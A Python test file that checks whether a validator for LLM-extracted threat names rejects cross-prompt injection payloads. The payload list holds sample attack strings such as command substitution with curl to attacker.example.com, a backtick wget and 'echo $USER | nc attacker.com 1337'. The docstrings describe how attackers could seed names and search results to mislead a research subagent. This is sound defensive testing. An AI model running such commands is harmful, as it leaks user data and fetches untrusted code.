"""XPIA (cross-prompt injection) resistance tests (AndroDR #119).

Since extraction moved fully to the LLM (regex patterns 1-6 removed), the
test surface is the `--validate-tokens` pipe: given any JSON list of
candidate strings (simulating LLM output, adversarial or benign), the
script's structural filter must

- Reject shell metacharacters, URLs, template placeholders, over-long
  strings, wrong-shape tokens.
- Permit plausibly-shaped novel names — those are caught by the research
  subagent's web-search + the human approval gate at Step 7, not here.
- Cap flood-attack LLM output at 20 items.

These tests exercise the structural defense directly; the end-to-end
extraction flow (parser → per-post LLM → validator) lives in the skill
orchestration and is covered by dogfood runs, not unit tests.
"""
import json
import pathlib
import subprocess
import sys

FIXTURES = pathlib.Path(__file__).resolve().parent.parent / "fixtures" / "discover"
SCRIPT = pathlib.Path(__file__).resolve().parent / "discover_extract.py"


def test_validate_tokens_rejects_structural_injection_payloads():
    """Structural XPIA defense test — pipes shell-metachar/URL/length-
    outlier payloads directly into --validate-tokens mode, asserts the
    token-shape validator rejects them.

    THREAT MODEL NOTE (important — see test_validate_tokens_permits_plausible_novel_names):
    The structural validator's job is to prevent dangerous LLM output
    classes: shell metacharacters, URLs, over-long strings, wrong-shape
    tokens. It does NOT promise to block every adversary-plausible
    novel threat name (e.g., "YasirHamzaTrojan") — such names would
    pass the validator, reach the dispatcher, and trigger a research-
    threat subagent doing web search, which THEN faces the human-in-
    the-loop approval gate at Step 7.
    """
    structural_payloads = [
        "{{FLAG}}",  # Template variable injection
        "install.sh",  # Shell script filename (period)
        "trojan.apk",  # APK filename (period)
        "evil.invalid",  # Fake TLD (period)
        "http://attacker.com",  # URL with scheme (colon + slashes)
        "https://attacker.example.com/callback",  # HTTPS URL
        "ftp://internal.example.com",  # Alternate scheme
        "$(curl https://attacker.example.com)",  # Command substitution
        "`wget evil.invalid/x`",  # Backtick command
        "echo $USER | nc attacker.com 1337",  # Pipe + metachars
        "a" * 50,  # Length-outlier (>40)
        "lowercase",  # Not starting with uppercase
        "-dashprefix",  # Leading hyphen
        "Has$Metachar",  # Embedded shell metachar
        "Has|Pipe",
        "Has;Semicolon",
        "Has&Amp",
        "Has>Redirect",
    ]
    result = subprocess.run(
        [sys.executable, str(SCRIPT),
         "--validate-tokens",
         "--denylist", str(FIXTURES / "denylist.yml")],
        input=json.dumps(structural_payloads),
        capture_output=True, text=True, check=False,
    )
    assert result.returncode == 0, f"--validate-tokens failed: {result.stderr}"
    filtered = json.loads(result.stdout)
    assert filtered == [], (
        f"--validate-tokens leaked structural injection payloads: {filtered}. "
        f"None of these should pass token-shape validation."
    )


def test_validate_tokens_permits_plausible_novel_names():
    """Documents the threat-model boundary: the structural validator does
    NOT (and cannot) block adversary-chosen plausible novel threat names.

    Names like "YasirHamzaTrojan" or "MaliciousFamily" that happen to
    match the valid-token shape pass the filter. They would then reach
    the research-threat subagent, which does a web search, which returns
    whatever the attacker pre-seeded via SEO. The human approval gate
    at dispatcher Step 7 is the defense against that class — not this
    validator.

    This test asserts that behavior explicitly, so a future reader doesn't
    wrongly assume the validator promises what it can't deliver.
    """
    plausible_adversary_names = [
        "YasirHamzaTrojan",
        "MaliciousFamily",
        "EvilDataKit",
    ]
    result = subprocess.run(
        [sys.executable, str(SCRIPT),
         "--validate-tokens",
         "--denylist", str(FIXTURES / "denylist.yml")],
        input=json.dumps(plausible_adversary_names),
        capture_output=True, text=True, check=False,
    )
    assert result.returncode == 0
    filtered = json.loads(result.stdout)
    # These DO pass the validator — that's the documented behavior.
    assert set(filtered) == set(plausible_adversary_names), (
        f"expected plausible-but-novel names to pass structural validator; "
        f"got filtered={filtered}, input={plausible_adversary_names}. "
        f"If this test is failing because those names are now in the denylist, "
        f"that's a different defense layer; update the test."
    )


def test_validate_tokens_preserves_legitimate_names():
    """Sanity check: legitimate threat names pass the validator."""
    legit = ["SparkKitty", "Bitter", "CVE-2026-0049", "Silver Fox", "GriftHorse"]
    result = subprocess.run(
        [sys.executable, str(SCRIPT),
         "--validate-tokens",
         "--denylist", str(FIXTURES / "denylist.yml")],
        input=json.dumps(legit),
        capture_output=True, text=True, check=False,
    )
    assert result.returncode == 0
    filtered = json.loads(result.stdout)
    assert set(filtered) == set(legit), (
        f"legitimate threat names were incorrectly filtered.\n"
        f"Input: {legit}\nFiltered output: {filtered}"
    )


def test_validate_tokens_caps_at_20():
    """Flood-attack defense: LLM output of >20 items is truncated."""
    flood = [f"FakeThreat{i:03d}" for i in range(30)]  # 30 items
    result = subprocess.run(
        [sys.executable, str(SCRIPT),
         "--validate-tokens",
         "--denylist", str(FIXTURES / "denylist.yml")],
        input=json.dumps(flood),
        capture_output=True, text=True, check=False,
    )
    assert result.returncode == 0
    filtered = json.loads(result.stdout)
    assert len(filtered) <= 20, f"--validate-tokens emitted {len(filtered)} items; cap is 20"
